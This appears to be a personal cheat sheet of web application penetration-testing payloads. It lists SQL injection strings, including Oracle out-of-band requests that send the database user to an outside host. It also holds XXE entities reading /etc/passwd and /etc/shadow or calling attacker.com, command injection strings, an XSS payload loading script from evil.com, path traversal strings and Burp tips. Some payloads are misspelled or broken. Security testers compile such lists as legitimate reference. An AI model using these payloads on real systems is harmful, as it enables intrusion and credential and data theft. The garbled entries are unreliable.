# pentesting-payloads
web app security payloads
' ; comment delimiters (-- or /* */, etc)
'
"
#
;
'/*'
--
/*!
*/--
BENCHMARK()
UTL_INADAR.get_host_address('google.com')
1’ or ‘1’ = ‘1
1’%20or%20’1’%20=%20’1
1’ or ‘1’ = ‘1’))/*
1’ or ‘1’ = ‘1’)) LIMIT 1/*
10 AND 1=2
AND 1=1
MySql: ‘test’ + ‘ing’
SQL Server: ‘test’ ‘ing’
Oracle: ‘test’||’ing’
PostgreSQL: ‘test’||’ing’
'+or+'1'='1--
'+order+by+10--+

ORDER BY 10--
Unknown column ‘10’ in ‘order clause’

Assuming there were 3 columns
in the example above,
10 UNION SELECT
1,null,null--
10 UNION SELECT
1,1,null--
UNION
SELECT 1,1,null--

$Id=1’ AND ASCII(SUBSTRING(username,1,1))=97 AND ‘1’=’1

oracle
id=10||UTL_INADDR.
GET_HOST_NAME( (SELECT user FROM DUAL) )--
d=10||UTL_HTTP.
request(‘testerserver.com:80’||(SELET user FROM DUAL)--
id=10 AND IF(version()
like ‘5%’, sleep(10), ‘false’))--

http://server.example.com/pls/dad/orasso.home?);--=BAR
DICK’ENS
DICK’||’ENS

password like ‘A%’
[2] The ASCII values in a concatenated hex:
password LIKE 0x4125
[3] The char() function:
password LIKE CHAR(65,37)

my sql
1 /*! and 1=0 */
1 AND 1=0 UNION SELECT @@version /*
1 AND @@version like ‘4.0%’
1 AND USER() like ‘root%’
1 AND 1=0 UNION SELECT DATABASE()
1 AND DATABASE() like ‘db%’

xml comment tag
Comment tag: <!--/-->

<username><![CDATA[<$userName]]></username> -- inside cdta is a string 
<html>
<![CDATA[<]]>script<![CDATA[>]]>alert(‘xss’)<![CDATA[<]]>/
script<![CDATA[>]]>
</html>

<?xml version=”1.0” encoding=”ISO-8859-1”?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM “file:///dev/random” >]><foo>&xxe;</
foo>

<?xml version=”1.0” encoding=”ISO-8859-1”?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM “file:///etc/passwd” >]><foo>&xxe;</foo>

<?xml version=”1.0” encoding=”ISO-8859-1”?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM “file:///etc/shadow” >]><foo>&xxe;</foo>

<?xml version=”1.0” encoding=”ISO-8859-1”?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM “file:///c:/boot.ini” >]><foo>&xxe;</foo>

<?xml version=”1.0” encoding=”ISO-8859-1”?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM “http://www.attacker.com/text.txt”
>]><foo>&xxe;</foo>

server side injection 
<!--#echo var=”DATE_LOCAL” -->
<!--#include virtual=”/cgi-bin/counter.pl” -->
<!--#include virtual=”/footer.html” -->
<!--#exec cmd=”ls” -->

command injection
http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
http://sensitive/something.php?dir=%3Bcat%20/etc/passwd
Doc=Doc1.pdf+|+Dir c:\   -- parameter

Example 4 Checking for Client-initiated Renegotiation and Secure
Renegotiation via openssl (manually)
$ openssl s_client -connect www2.example.com:443
CONNECTED(00000003)


Example 5. Testing supported Cipher Suites, BEAST and CRIME
attacks via TestSSLServer
$ java -jar TestSSLServer.jar www3.example.com 443

Example 6. Testing SSL/TLS vulnerabilities with sslyze

Example 8. Testing SSL/TLS with SSL Breacher

DOM
#red;-:expression(alert(URL=1));
com/#red;-o-link:’javascript:alert(1)’;-o-linksource:
current;
#http://evil.com/js.js

command injection 
dir 
dir=/public |%20cat%20/etc/passwd
ping google.com
	`ping google.com;`
&& ipconfig
| ping -i 30 127.0.0.1 |
  | ping -n 30 127.0.0.1 |
  & ping -i 30 127.0.0.1&
  & ping -n 30 127.0.0.1&
  ; ping -i 30 127.0.0.1;
  %0a ping -i 30 127.0.0.1 %0a
  ping 127.0.0.1
dir
| dir
; dir
$(`dir`)
& dir
&&dir
&& dir
| dir C:\
; dir C:\
& dir C:\
&& dir C:\
dir C:\
eval('ls')
eval('pwd')
eval('pwd');
eval('sleep 5')
eval('sleep 5');
eval('whoami')
eval('whoami');
exec('echo 
exec('ls')
exec('pwd')
exec('pwd');
exec('sleep 5')
exec('sleep 5');
exec('whoami')
exec('whoami');
;{$_GET["cmd"]}
calc & echo "test"
"cmd /c whoami"
/index.php?arg=1; system('id')
/index.php?arg=1; phpinfo()
& ping -c 10 127.0.0.1 &
| whoami
; whoami
' whoami
' || whoami
' & whoami
' && whoami
'; whoami
" whoami
" || whoami
" | whoami
" & whoami
" && whoami
"; whoami
$(`whoami`)
& whoami
|| ping -c 10 127.0.0.1 ; x || ping -n 10 127.0.0.1 &
| ls /var/www ; x &
` & | $ ( ) ;

system('ping%20127.0.0.1')

path traversal
../../../../boot.ini%00.jpg
../../../../etc/passwd%oa.jpg

/../../../../etc/shadow
..\..\..\windows\win.ini

XSS
+ADw-script+AD4-alert(1;)+ADw-/script+AD4-
"><h1>test</h1>
'+alert(1)+'
"onmouseover="alert(1)
http://"onmouseover="alert(1)
> \x3e
< \x3c

sql 
' OR 1='1--
' AND 0='1--
' UNION SELECT 1,2,3--


burp
in proxy options we have unhide hidden content option. It will make the hidden content visible. 
if you want encode the key charecters in burp hit windows+U
we can do brute force attack by guessing the passwords in the intruder.
scan specific post request instead of scanning the whole application. 
in repeater select auto mark when text changes option
repeater http pipelining 
project options -->stresming responses to cache poisioning 
i can import all my paylods files to burp intruder


